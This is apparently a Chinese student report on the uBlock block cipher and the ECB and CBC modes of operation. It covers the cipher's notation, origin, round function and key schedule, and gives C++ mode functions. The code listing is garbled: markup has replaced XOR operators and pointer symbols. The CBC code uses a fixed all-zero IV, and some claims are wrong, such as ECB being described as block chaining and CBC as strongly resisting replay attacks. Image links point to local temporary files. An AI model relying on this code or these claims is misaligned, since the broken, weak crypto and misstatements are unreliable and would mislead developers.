&lt;&lt; <span class=\"string\">&quot; milliseconds&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"关于ublock加密算法的调研分析\"><a class=\"anchor\" href=\"#关于ublock加密算法的调研分析\">#</a> <strong>关于 uBlock 加密算法的调研分析</strong></h1>\n<p>目录</p>\n<p><a href=\"#_Toc5215\">1 引言\t</a></p>\n<p><a href=\"#_Toc22057\">2. 符号\t</a></p>\n<p><a href=\"#_Toc14603\">2.1 uBlock 所用符号\t</a></p>\n<p><a href=\"#_Toc26774\">2.2 uBlock 术语解释\t</a></p>\n<p><a href=\"#_Toc7826\">2.2.1 并置\t</a><br />\n2.2.2 半字节（Nibble）\t4</p>\n<p><a href=\"#_Toc1851\">2.2.3 向量置换（Permutation of Vectors）\t</a></p>\n<p><a href=\"#_Toc25622\">2.2.4 轮密钥（Round Key）\t</a></p>\n<p><a href=\"#_Toc9457\">3.uBlock 分组密码及两种工作模式的来历\t</a></p>\n<p><a href=\"#_Toc18505\">3.1 uBlock 算法来历\t</a></p>\n<p><a href=\"#_Toc10233\">3.2 ECB 分组密码模式来历\t</a></p>\n<p><a href=\"#_Toc31089\">3.2.1 ECB 的设计背景\t</a></p>\n<p><a href=\"#_Toc2653\">3.2.2 ECB 的来历\t</a></p>\n<p><a href=\"#_Toc714\">3.2.3 ECB 的迭代过程\t</a></p>\n<p><a href=\"#_Toc9825\">3.2.4 ECB 的安全性讨论\t</a></p>\n<p>3.3 CBC 模式分析\t6<br />\n3.3.1 CBC 模式的设计背景\t6<br />\n3.3.2 CBC 模式的来历\t6<br />\n3.3.3 CBC 模式的迭代构成\t6<br />\n3.3.4 CBC 模式的安全性讨论\t7</p>\n<p><a href=\"#_Toc10676\">4. uBlock 加密算法的总体框架与数据结构\t</a></p>\n<p><a href=\"#_Toc22371\">4.1 uBlock 算法的总体框架\t</a><br />\n4.1.1 uBlock 加密算法\t7<br />\n4.1.2 uBlock 解密算法\t9<br />\n4.1.3 uBlock 密钥扩展算法\t10</p>\n<p>4.2 uBlock 算法的数据结构\t11</p>\n<p><a href=\"#_Toc24973\">4.2.1 S 盒 (Substitution boxes)\t</a></p>\n<p><a href=\"#_Toc6879\">4.2.2 向量置换 (Vector Permutations)\t</a></p>\n<p><a href=\"#_Toc29481\">4.2.3 轮密钥 (Round Keys)\t</a></p>\n<p><a href=\"#_Toc31348\">4.2.4 密钥扩展算法 (Key Schedule)\t</a></p>\n<p><a href=\"#_Toc7498\">4.2.5 数据块的处理\t</a></p>\n<p><a href=\"#_Toc3860\">5. uBlock 的算法实现\t</a><br />\n5.1 基础代码设计\t12<br />\n5.2 评估正确性\t16<br />\n5.3 评估吞吐量和速度\t17</p>\n<p><a href=\"#_Toc23937\">6 以 uBlock 的 ECB 和 CBC 模式加密朱鹮.bmp 文件\t</a><br />\n6.1 BMP 文件格式解析\t18<br />\n6.2 BMP 文件加密技巧\t18<br />\n6.3 ECE 和 CBC 模式加解密结果\t19<br />\n6.3.1 ECB 模式进行加解密\t19<br />\n6.3.2 CBC 模式进行加解密\t19<br />\n6.3.3 ECB 和 CBC 模式的分析和对比\t20</p>\n<p><a href=\"#_Toc11983\">7 总结\t</a></p>\n<h1 id=\"关于ublock加密算法的调研分析-2\"><a class=\"anchor\" href=\"#关于ublock加密算法的调研分析-2\">#</a> <strong>关于 uBlock 加密算法的调研分析</strong></h1>\n<p>**** 摘要：**** 本文深入研究了 uBlock 和 ECB 两种分组密码算法，介绍了这两种算法的起源、设计原理、实现方法以及应用场景。通过对 uBlock 算法的详细剖析，解释了其设计的技术标准、密钥扩展机制以及加解密流程。此外，还探讨了 ECB 模式的设计背景与安全性讨论，指出了其在特定应用中的局限性。文章还包括了使用 C++ 实现的算法编程实例，验证了算法的正确性，并通过加密图像文件的实验，评估了两种算法在不同工作模式下的性能和安全性。通过实际应用案例，本文展示了分组密码在信息安全领域的重要性和实用价值。</p>\n<p>**** 关键词：**** 分组密码，uBlock，ECB 模式，密钥扩展，算法安全性，图像加密</p>\n<h2 id=\"1-引言\"><a class=\"anchor\" href=\"#1-引言\">#</a> <strong>1 引言</strong></h2>\n<p>随着信息技术的迅速发展，数据安全和隐私保护成为了网络空间安全的重要组成部分。分组密码作为保护电子数据的基本手段，承担着加密重要信息、防止数据泄露的关键角色。本文选择了两种具有代表性的分组密码算法：uBlock 和 ECB 模式，对它们的设计理念、实现过程以及安全性能进行了全面的分析和评估。</p>\n<p>uBlock 算法源于全国密码算法设计竞赛，它使用复杂的密钥扩展和多轮加密机制来提高安全性。这种算法设计考虑到了抵抗差分攻击和线性攻击的需求，适合于需要高安全标准的应用场景。而 ECB 模式，作为一种基础的加密模式，因其实现的简单性，在某些低安全需求的场合中仍被广泛使用，尽管它在处理大量具有重复模式的数据时存在安全隐患。</p>\n<p>在此基础上，本文还实现了这两种算法的编程模拟，并通过加密和解密图像文件的方法，直观地展示了它们在实际应用中的效果和性能，旨在为读者提供对分组密码在现实世界中应用的深入理解。通过对比分析和实验验证，本文不仅增强了对这两种算法性能和安全性的认识，也为未来选择和设计更加安全高效的加密方案提供了宝贵的经验和见解。</p>\n<p><strong>2. 符号</strong></p>\n<p><strong>2.1 uBlock 所用符号</strong></p>\n<p>表 1 uBlock 符号表</p>\n<table>\n<thead>\n<tr>\n<th><strong>X</strong></th>\n<th><strong>n</strong> 比特明文</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Y</strong></td>\n<td>n 比特密文</td>\n</tr>\n<tr>\n<td><strong>K</strong></td>\n<td>k 比特密钥</td>\n</tr>\n<tr>\n<td><strong>PK****i</strong></td>\n<td>n 比特轮密钥</td>\n</tr>\n<tr>\n<td><strong>PL<strong><strong>n</strong></strong>，PR<strong><strong>n</strong></strong>，PL****-1****，PR<strong><strong>n</strong></strong>-1</strong></td>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps13.png)</td>\n</tr>\n<tr>\n<td><strong>s</strong></td>\n<td>4 比特 S 盒</td>\n</tr>\n<tr>\n<td><strong>S<strong><strong>n</strong></strong>，S<strong><strong>n</strong></strong>-1</strong></td>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps14.png)</td>\n</tr>\n<tr>\n<td><strong>S****k</strong></td>\n<td>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps15.png)</td>\n</tr>\n<tr>\n<td><strong>PK****1</strong></td>\n<td>16 个半字节的向量置换</td>\n</tr>\n<tr>\n<td><strong>PK<strong><strong>2</strong></strong>，PK****3</strong></td>\n<td>32 个半字节的向量置换</td>\n</tr>\n<tr>\n<td>⊕</td>\n<td>模 2 加运算</td>\n</tr>\n<tr>\n<td>&lt;&lt;&lt;b</td>\n<td>循环左移 b 比特</td>\n</tr>\n<tr>\n<td>&lt;&lt;&lt;b 32</td>\n<td>分款 32 比特循环左移 b 比特</td>\n</tr>\n<tr>\n<td>||</td>\n<td>表示比特串的连接</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"22-ublock术语解释\"><a class=\"anchor\" href=\"#22-ublock术语解释\">#</a> <strong>2.2 uBlock 术语解释</strong></h4>\n<h5 id=\"221-并置\"><a class=\"anchor\" href=\"#221-并置\">#</a> <strong>2.2.1 并置</strong></h5>\n<p>在密码学和算法设计中，&quot;并置&quot;（Concatenation）通常指的是将多个数据元素或操作按顺序排列在一起，形成一个连续的整体。在 uBlock 算法的上下文中，这个术语特别指向几个方面：<br />\nS 盒并置：在 uBlock 算法中，一个 S 盒操作通常处理 4 比特的输入，输出也是 4 比特。当我们谈到 &quot;S 盒并置&quot; 时，这意味着将多个 S 盒操作排列在一起，以并行处理更多的数据位。</p>\n<p>例如，如果有一个 128 比特的数据块，而每个 S 盒处理 4 比特，那么需要 32 个这样的 S 盒并置在一起，以便同时处理所有 128 比特。这 32 个 S 盒可以是相同的（即使用相同的替换规则），或者各不相同，具体取决于算法设计。</p>\n<p>数据并置：数据并置是指将多个较小的数据块（如多个 4 比特的输出）结合成一个较大的数据块。在 uBlock 中，经过 S 盒处理的数据通常需要进行进一步的变换，如置换或与轮密钥进行 XOR 操作，这时候并置的数据可以直接用于这些操作。</p>\n<p><strong>2.2.2 半字节（Nibble）</strong><br />\n半字节通常指的是 4 比特的数据块。在一个字节（通常为 8 比特）中包含两个半字节。在许多加密算法中，尤其是在对数据执行 S 盒变换时，常常以半字节为单位来处理数据。使用半字节是因为它允许在较小的数据单位上进行高效的非线性变换，这在很多加密标准（如 AES 的前身 DES）中是一种常见的做法。</p>\n<h5 id=\"223-向量置换permutation-of-vectors\"><a class=\"anchor\" href=\"#223-向量置换permutation-of-vectors\">#</a> <strong>2.2.3 向量置换（Permutation of Vectors）</strong></h5>\n<p>向量置换涉及对一个数据向量（可以理解为一系列数据元素的数组）进行重新排序或置换。在密码学中，这种操作用于打乱数据元素的顺序，增加密码算法的扩散性质。扩散是指输入的一个小变化（比如改变一个比特）会影响输出中多个或大部分比特的属性，从而提高了算法的安全性。</p>\n<p>向量置换的具体实例包括 PL 和 PR 操作：这些是特定的置换操作，它们以某种特定的顺序重新排列输入向量的元素。这些置换规则通常事先定义好，并用于算法的各个阶段来增加复杂性和安全性。</p>\n<h5 id=\"224轮密钥round-key\"><a class=\"anchor\" href=\"#224轮密钥round-key\">#</a> <strong>2.2.4 轮密钥（Round Key）</strong></h5>\n<p>在循环结构的密码算法中（如 AES 或 uBlock），轮密钥是密钥扩展过程生成的一系列密钥，每一轮加密使用一种不同的轮密钥。使用不同的轮密钥是为了防止某些攻击技术，比如差分攻击和线性攻击，它们可能在多轮中利用相同密钥的重复使用来推导出密钥信息。</p>\n<h2 id=\"3ublock分组密码及两种工作模式的来历\"><a class=\"anchor\" href=\"#3ublock分组密码及两种工作模式的来历\">#</a> <strong>3.uBlock 分组密码及两种工作模式的来历</strong></h2>\n<h4 id=\"31-ublock算法来历\"><a class=\"anchor\" href=\"#31-ublock算法来历\">#</a> <strong>3.1 uBlock 算法来历</strong></h4>\n<p>中国全国密码算法设计竞赛是一个旨在推动密码学领域技术进步的活动。为贯彻落实习近平网络强国战略思想和党的十九大精神，繁荣我国密码理论和应用研究，推动密码算法设计和实现技术进步，促进密码人才成长，学会决定举办全国密码算法设计竞赛。在 2019 年 10 月 25 日，中国密码学会发出了全国密码算法设计竞赛通知。在这个竞赛中，密码学家们提交自己设计的密码算法，经过评审和测试，优秀的算法将进入下一轮评选。</p>\n<p>该分组密码算法的设计和提交必须符合一系列详尽的技术标准，以确保算法的安全性、高效性及实用性。首先，算法需提供完整的描述，包括所有必要的数学公式、图表和参数，并附上充分的测试实例来验证算法的正确性。设计原理部分应详细阐述算法的构思、主要策略及关键设计决策。安全性分析要详细评估算法对抗各种已知攻击的能力，包括理论上的安全证明及特殊密钥条件的分析。性能分析需考虑算法在不同的软硬件环境下的运行效率和资源消耗。此外，还必须清楚地声明算法的优点和可能的不足，包括创新性和在各种平台上的表现。算法还需要提供标准的 ANSI C 编程接口，确保其实现的标准化和可移植性。最后，参赛者必须提交一套完整的材料，包括算法描述、代码实现、支持文档及原创性声明，所有提交材料需用中文撰写，以满足比赛的形式规范。这些严格的要求确保了提交的分组密码算法既安全可靠，又具备实际应用的可行性和效率。</p>\n<p>而 uBlock 分组密码算法是本次密码算法设计竞赛的获奖作品，由来自中国科学院软件研究所的吴文玲、张 蕾、郑雅菲、李灵琛共同设计而来。</p>\n<h4 id=\"32-ecb分组密码模式来历\"><a class=\"anchor\" href=\"#32-ecb分组密码模式来历\">#</a> <strong>3.2 ECB 分组密码模式来历</strong></h4>\n<p>ECB（电子密码本模式，Electronic Codebook Mode）是一种基础的加密算法模式，其设计背景和迭代过程可以追溯到早期的计算机安全需求。</p>\n<h5 id=\"321-ecb的设计背景\"><a class=\"anchor\" href=\"#321-ecb的设计背景\">#</a> <strong>3.2.1 ECB 的设计背景</strong></h5>\n<p>在早期计算机网络和系统中，数据安全开始受到关注，特别是在商业和政府通信中。随着信息技术的发展，保护数据免受未经授权的访问变得尤为重要。在此背景下，ECB 模式作为一种基本的加密模式应运而生，其主要目的是提供一种简单直接的方法来加密固定大小的数据块。</p>\n<h5 id=\"322-ecb的来历\"><a class=\"anchor\" href=\"#322-ecb的来历\">#</a> <strong>3.2.2 ECB 的来历</strong></h5>\n<p>ECB 模式的核心概念非常简单：将明文分割成多个等长的块，每个块独立加密。这种模式的一个关键特点是它不涉及复杂的初始化向量（IV）或状态维护，这使得实现起来相对简单直接。ECB 模式可以使用任何固定长度的块密码来加密数据，如 DES（数据加密标准）或后来的 AES（高级加密标准）。</p>\n<h5 id=\"323-ecb的迭代过程\"><a class=\"anchor\" href=\"#323-ecb的迭代过程\">#</a> <strong>3.2.3 ECB 的迭代过程</strong></h5>\n<p>ECB 模式的设计没有经历复杂的迭代过程，因为它本质上是最简单的块密码加密模式。然而，随着对加密技术的理解加深，安全社区逐渐认识到 ECB 模式在安全性方面的局限性，尤其是其在处理大量数据时容易泄露模式信息的问题。因此，出现了更为复杂的加密模式，如 CBC（密码块链接模式）、CFB（密码反馈模式）和 OFB（输出反馈模式），这些模式通过引入 IV 和更复杂的运算过程来增强安全性，从而克服了 ECB 的一些安全缺陷。</p>\n<h5 id=\"324-ecb的安全性讨论\"><a class=\"anchor\" href=\"#324-ecb的安全性讨论\">#</a> <strong>3.2.4 ECB 的安全性讨论</strong></h5>\n<p>尽管 ECB 因其实现简单而在某些应用中仍然被使用，但它通常不推荐用于需要高安全性的场景。因为 ECB 模式对于相同的明文块总是生成相同的密文块，这使得它对于某些类型的数据（尤其是那些包含重复模式的数据）来说，可能会暴露出明显的模式，从而容易被攻击者利用。</p>\n<p><strong>3.3 CBC 模式分析</strong><br />\n CBC（Cipher Block Chaining）模式是一种广泛使用的块加密操作模式，它通过链式反馈机制增加了加密过程的复杂性和安全性。以下是 CBC 模式的详细介绍，包括设计背景、来历、迭代过程和安全性讨论。</p>\n<h5 id=\"331-cbc模式的设计背景\"><a class=\"anchor\" href=\"#331-cbc模式的设计背景\">#</a> <strong>3.3.1 CBC 模式的设计背景</strong></h5>\n<p>CBC 模式在 1970 年代被 IBM 开发，目的是为了克服电子密码本（ECB）模式的一些显著安全缺陷。在 ECB 模式中，相同的明文块加密后会产生相同的密文块，这使得模式信息可能被泄露。这种特性特别不适用于加密大量数据或具有重复数据块的文件。因此，需要一种更安全的模式来提供更好的数据保密性，尤其是在数据块之间存在高度关联时。</p>\n<h5 id=\"332-cbc模式的来历\"><a class=\"anchor\" href=\"#332-cbc模式的来历\">#</a> <strong>3.3.2 CBC 模式的来历</strong></h5>\n<p>CBC 模式的设计利用了前一个块的密文来影响当前块的加密过程。这种设计首次在 IBM 的 Lucifer 加密算法中被提出并应用，后来这一概念被采纳并广泛应用于多种加密标准中，包括现代加密算法如 AES 和 DES。</p>\n<h5 id=\"333-cbc模式的迭代构成\"><a class=\"anchor\" href=\"#333-cbc模式的迭代构成\">#</a> <strong>3.3.3 CBC 模式的迭代构成</strong></h5>\n<p>CBC 模式的加密过程包括以下几个步骤：</p>\n<p>初始化向量（IV）：加密的第一个数据块需要一个初始化向量，这个向量通常是随机生成的，与明文一起发送，但不需要保密。</p>\n<p>链式反馈：每个明文块在加密之前，首先与前一个密文块进行 XOR 运算。对于第一个明文块，它与 IV 进行 XOR。</p>\n<p>块加密：XOR 运算后的结果使用加密算法和密钥进行加密。</p>\n<p>生成密文块：加密的输出形成当前的密文块，然后这个密文块被用于下一个块的加密过程。</p>\n<p>解密过程则是加密过程的逆操作：</p>\n<p>块解密：使用相同的密钥对密文块进行解密。</p>\n<p>XOR 运算：将解密后的输出与前一个密文块进行 XOR 运算，以恢复原始明文。对于第一个块，使用 IV 进行 XOR 运算。</p>\n<p>恢复明文块：输出最终的明文块。</p>\n<h5 id=\"334-cbc模式的安全性讨论\"><a class=\"anchor\" href=\"#334-cbc模式的安全性讨论\">#</a> <strong>3.3.4 CBC 模式的安全性讨论</strong></h5>\n<p>CBC 模式提供了比 ECB 更高的安全性，主要是因为它通过引入链式依赖机制抵消了明文中的模式。即便明文块完全相同，由于每个块与前一个块的密文相关联，因此相同的明文块不会生成相同的密文块。这种属性使得 CBC 模式对于模式分析和重放攻击具有很强的抵抗力。</p>\n<p>然而，CBC 模式并非完美无缺。例如，它容易受到填充攻击（如 Padding Oracle 攻击），因为加密过程依赖于块的完整性和正确的填充。此外，CBC 模式不提供身份验证，所以它可能受到篡改攻击，除非与消息认证码（MAC）或其他认证机制一起使用。</p>\n<p>总的来说，CBC 模式是一个在多个领域得到广泛应用的块加密模式，它提供了比 ECB 模式更高的安全保障，但需要正确实施和可能的安全增强来保护数据安全。</p>\n<h2 id=\"4-ublock加密算法的总体框架与数据结构\"><a class=\"anchor\" href=\"#4-ublock加密算法的总体框架与数据结构\">#</a> 4. <strong>uBlock 加密算法的总体框架与数据结构</strong></h2>\n<h4 id=\"41-ublock算法的总体框架\"><a class=\"anchor\" href=\"#41-ublock算法的总体框架\">#</a> 4.1 <strong>uBlock 算法的总体框架</strong></h4>\n<p>uBlock 一共包含 3 个版本，分组长度为 128 或 256 比特，密钥长度为 128 或者 256 比特，记为 uBlock-128/128 (明密文块 / 密钥)、uBlock-128/256、uBlock-256/256。三者的加解密基本一致，区别在于三个版本的迭代轮数 r 分别为 16,24,24。并且在轮密钥生成的时候，所用的向量置换分别为 16 字节的<strong> PK****1</strong>、32 字节的<strong> PK****2</strong>、32 字节的<strong> PK****3</strong>。<br />\n<strong>4.1.1 uBlock 加密算法</strong><br />\n下图是 uBlock 的加密伪代码与流程图示：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps16.jpg)![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps17.jpg)</p>\n<p>图 1（左）uBlock 的加密伪代码</p>\n<p>图 2（右）uBlock 加密轮变换流程图</p>\n<p>其中，我们可以由图示描述该加密算法即先把 n 比特明文 X 拆分成两个 n/2 比特的 X0 和 X1。根据明文 - 比特的关系选择合适的 r，并且在 0~r-1 范围内做 r 次加密其中每次加密:</p>\n<p>\\1. 先将 n 比特轮密钥 RKi 拆分成两个并置的密钥 RK0i 和 RK1i</p>\n<p>\\2. 调用一个 n/8 个 S 盒的并置 Sn。首先将 X0 异或 RK0i 后在 Sn 里查表得到新的 X0，然后将 X1 异或 RK1i 后在 Sn 里查表得到新的 X1</p>\n<p>\\3. X0 和 X1 异或后得到新的 X1。</p>\n<p>\\4. 将 32 位分块 X1 循环左移 4 比特后与 X0 异或得到新的 X0</p>\n<p>\\5. 将 32 位分块 X0 循环左移 8 比特后与 X1 异或得到新的 X1</p>\n<p>\\6. 将 32 位分块 X1 循环左移 8 比特后与 X0 异或得到新的 X0</p>\n<p>\\7. 将 32 位分块 X0 循环左移 20 比特后与 X1 异或得到新的 X1</p>\n<p>\\8. 将最终得到的 X0 和 X1 异或得到 X0</p>\n<p>\\9. 将 X0 在 n/16 向量置换 PLn (X0) 中进行置换</p>\n<p>\\10. 将 X1 在 n/16 向量置换 PRn (X1) 中进行置换<br />\n最终的密文 Y 即为第 r 轮密钥 RKr 与最终得到的 X0 和 X1 的并置进行异或。</p>\n<p>表 2  S 盒<br />\n！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps18.jpg)</p>\n<p>表 3 PLn 和 PRn</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps19.jpg)</p>\n<h5 id=\"412-ublock-解密算法\"><a class=\"anchor\" href=\"#412-ublock-解密算法\">#</a> <strong>4.1.2 uBlock 解密算法</strong></h5>\n<p>下图为 uBlock 的解密过程，即加密函数的逆变换，其中的 Sn-1、PLn-1、PRn-1 分别是 Sn、PLn 和 PRn 的逆，具体见表 3 和表 4.<br />\n![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps20.jpg)</p>\n<p>图 3 uBlock 解密算法伪代码</p>\n<p>表 4 s-1 盒</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps21.jpg)</p>\n<p>表 5 PLn-1 和 PRn-1<br />\n![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps22.jpg)</p>\n<h5 id=\"413-ublock密钥扩展算法\"><a class=\"anchor\" href=\"#413-ublock密钥扩展算法\">#</a> <strong>4.1.3 uBlock 密钥扩展算法</strong></h5>\n<p>将 k 比特密钥 K 放置在 k 比特寄存器，取寄存器的左 n 比特作为轮密钥 RK0 ，然后，对 1, 2,..., i r = ，更新寄存器，并取寄存器的左 n 比特作为轮密钥 RKi。具体更新方式如下：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps23.jpg)![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps24.jpg)</p>\n<p>图 4（左） 密钥扩展算法伪代码</p>\n<p>图 5（右） 密钥拓展算法流程图</p>\n<p>其中 Sk 是 k/16 个 4 比特 s 盒的并置，Tk 是对 K1 的每半字节⊗2，有限域 GF (24) 的不可约多项式 m (x)= x4+ x + 1:RCi 为 32 比特常数，作用在 K0 的左 32 比特。PKt 有三种情况，t =1, 2,3，PK1、PK2 和 PK3 分别用于 uBlock-128/128、uBlock-128/256 和 uBlock-256/256 的密钥扩展算法。PK1 是 16 个半字节的向量置换，PK2 和 PK3 都是 32 个半字节的向量置换，具体见下表。</p>\n<p>表 6 PKi 表</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps25.jpg)<br />\n 32 比特常数 RCi 生成具体是由 8 级 LFSR，初始条件为 c0=c3=c6=c7=0,c1=c2=c4=c5=1; 对于 i≥8，ci=ci-2⊕ci-3⊕ci-7⊕ci-8。令<br />\n！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps26.png)    ![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps27.png)        \t![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps28.png)   ![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps29.png)<br />\n 则 RCi=![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps30.png)</p>\n<p>常数 RCi（i=1,2.......24）的 16 进制如下表：</p>\n<p>表 7  RCi 表<br />\n！[img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps31.jpg)</p>\n<h4 id=\"42-ublock算法的数据结构\"><a class=\"anchor\" href=\"#42-ublock算法的数据结构\">#</a> 4.2 <strong>uBlock 算法的数据结构</strong></h4>\n<h5 id=\"421-s盒-substitution-boxes\"><a class=\"anchor\" href=\"#421-s盒-substitution-boxes\">#</a> 4.2.1 <strong>S 盒 (Substitution boxes)</strong></h5>\n<p>S 盒用于执行非线性变换，是密码算法中用于提高安全性的重要组件。它通过将输入的固定大小比特块映射到输出的操作来抵抗线性和差分密码分析。</p>\n<p>在 uBlock 中，S 盒是 4 比特的，即每个 S 盒将 4 比特的输入映射到 4 比特的输出。由于 uBlock 处理 128 比特或 256 比特的数据块，因此需要多个这样的 S 盒并置使用，以覆盖整个数据块。</p>\n<h5 id=\"422-向量置换-vector-permutations\"><a class=\"anchor\" href=\"#422-向量置换-vector-permutations\">#</a> 4.2.2 <strong>向量置换 (Vector Permutations)</strong></h5>\n<p>向量置换用于重新排列加密数据的比特，增强密码的扩散性。这种扩散确保了输入的微小变化可以影响到输出的多个比特，从而增加破解难度。</p>\n<p>uBlock 算法使用两种主要的向量置换，分别称为 PL 和 PR。这些置换是预定义的，并根据不同的加密需求（如 128 比特或 256 比特）进行调整。</p>\n<h5 id=\"423-轮密钥-round-keys\"><a class=\"anchor\" href=\"#423-轮密钥-round-keys\">#</a> 4.2.3 <strong>轮密钥 (Round Keys)</strong></h5>\n<p>轮密钥用于各加密轮中与数据进行 XOR 运算，是提供加密强度的关键。不同的轮使用不同的轮密钥，以防止重复使用相同密钥带来的安全风险。</p>\n<p>轮密钥通过密钥扩展算法从主密钥生成。在 uBlock 中，密钥扩展包括使用 S 盒、固定的置换模式（PK1, PK2, PK3）和轮常数，为每一轮生成唯一的轮密钥。</p>\n<h5 id=\"424-密钥扩展算法-key-schedule\"><a class=\"anchor\" href=\"#424-密钥扩展算法-key-schedule\">#</a> 4.2.4 <strong>密钥扩展算法 (Key Schedule)</strong></h5>\n<p>密钥扩展算法用于生成足够数量的轮密钥，支持加密过程中每一轮的需要。</p>\n<p>这一算法涉及到对原始密钥的多次变换，包括应用 S 盒、向量置换和与轮常数的 XOR 运算。这些操作增加了密钥的不可预测性和算法的整体安全性。</p>\n<h5 id=\"425-数据块的处理\"><a class=\"anchor\" href=\"#425-数据块的处理\">#</a> 4.2.5 <strong>数据块的处理</strong></h5>\n<p>在 uBlock 算法中，明文数据块根据算法版本（128 比特或 256 比特）被处理。每次加密操作对数据块进行分割、替换、置换和合并。</p>\n<p>数据在加密过程中经历多个阶段的处理，包括并置、分割和轮内操作，这些操作通过特定的加密逻辑紧密结合。</p>\n<p>这些组件共同构成了 uBlock 算法的核心，通过精心设计的数据处理步骤和算法结构，uBlock 能够有效地在保护信息安全的同时，维持处理效率。这种设计不仅使其在理论上安全，而且在实际应用中也表现出高效的执行能力，适应于各种硬件和软件环境。</p>\n<h2 id=\"5-ublock的算法实现\"><a class=\"anchor\" href=\"#5-ublock的算法实现\">#</a> 5. <strong>uBlock 的算法实现</strong></h2>\n<h4 id=\"51-基础代码设计\"><a class=\"anchor\" href=\"#51-基础代码设计\">#</a> <strong>5.1 基础代码设计</strong></h4>\n<p>通过综合考虑通用性和常用性，我们在这主要介绍 uBlock128/128 版本的加密算法代码实现。首先我根据设计文档和已给代码来编写出<strong> uBlock_Windows_128_128.cpp</strong> 文件，代码附于附件<br />\n主要函数包括：<br />\n（1）密钥调度（uBlock_128_KeySchedule 函数）：此函数接收一个密钥并生成多个轮次密钥，存储在 Subkey 数组中。它利用了 SIMD 指令来并行处理多个操作，提高了密钥生成的效率。</p>\n<p>（2）加密函数（uBlock_128_Encrypt）：此函数实现了加密过程，使用预先生成的轮次密钥对输入的明文进行加密，产生密文。加密过程包括多个轮次，每个轮次都使用不同的密钥和数据转换，例如置换和替代。</p>\n<p>（3）解密函数（uBlock_128_Decrypt）：与加密函数类似，但按相反顺序应用轮次密钥和转换，以从密文恢复明文</p>\n<p>（4）CBC 模式实现（Crypt_Enc_Block_CBC 和 Crypt_Dec_Block_CBC 函数）：这些函数实现了密码块链接（CBC）模式的加密和解密。在 CBC 模式中，每个块的加密依赖于前一个块的加密输出，提高了加密过程的安全性。</p>\n<p>（5）ECB 模式实现（Crypt_Enc_Block_ECB 和 Crypt_Dec_Block_ECB 函数）：这些函数实现了密码块链接（ECB）模式的加密和解密。</p>\n<p>首先我们给出在 vscode 上将<strong> uBlock_Windows_128_128.cpp</strong> 编译成 exe 的代码为 “<strong>g++ &quot;-msse4.1&quot; -o main uBlock_Windows_128_128.cpp</strong>”。<br />\n接下来我仅附 ECB 和 CBC 加解密代码，其余代码请参考附件：</p>\n<ol>\n<li>int Crypt_Enc_Block_CBC(unsigned char *input, int in_len, unsigned char *output, int <em>out_len, unsigned char <em>key, int keylen)2. <ruby>3. int g, j;4. unsigned char iv[16] = {0};5. uBlock_128_KeySchedule(key);6. for (g = 0; g &lt; in_len / 16; g++)7. {8.  for(j = 0; j &lt; 16; j++)9.  {10.  iv[j] <rp>(</rp><rt> input[g * 16 + j];11.  </rt><rp>)</rp></ruby>12.  uBlock_128_Encrypt(iv, output+g</em>16, 16);13.  memcpy(iv, output+g</em>16, 16);14. }15. *out_len = in_len - in_len % 16;16. 17. return 0;18. }19. 20. int Crypt_Dec_Block_CBC(unsigned char *input,int in_len, unsigned char *output,int *out_len, unsigned char <em>key, int keylen)21. <ruby>22. int g, j;23. unsigned char iv[16] = {0};24. 25. uBlock_128_KeySchedule(key);26. 27. for (g = 0; g &lt; in_len / 16; g++)28. {29.  uBlock_128_Decrypt(input+g*16, output+g*16, 16);30.  for(j = 0; j &lt; 16; j++)31.  {32.  output[g * 16 + j] <rp>(</rp><rt> iv[j];33.  </rt><rp>)</rp></ruby>34.  memcpy(iv, input+g</em>16, 16);35. }36. *out_len = in_len - in_len % 16;37. return 0;38. }39. int Crypt_Enc_Block_ECB(unsigned char *input, int in_len, unsigned char *output, int *out_len, unsigned char *key, int keylen)40. {41.   int g;42.   43.   uBlock_128_KeySchedule(key);44.   45.   for (g = 0; g &lt; in_len / 16; g++)46.   {47.     uBlock_128_Encrypt(input + g * 16, output + g * 16, 16); 48.   }49.   *out_len = in_len - in_len % 16;50.   return 0;51. }52. int Crypt_Dec_Block_ECB(unsigned char *input, int in_len, unsigned char *output, int *out_len, unsigned char *key, int keylen)53. {54.   int g;  55.   uBlock_128_KeySchedule(key);56.   for (g = 0; g &lt; in_len / 16; g++)57.   {58.     uBlock_128_Decrypt(input + g * 16, output + g * 16, 16); 59.   }60.   *out_len = in_len - in_len % 16;61.   return 0;62. }</li>\n</ol>\n<p>我的算法流程图如下：<br />\n![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps32.jpg)</p>\n<p>图 6 代码流程图（AI 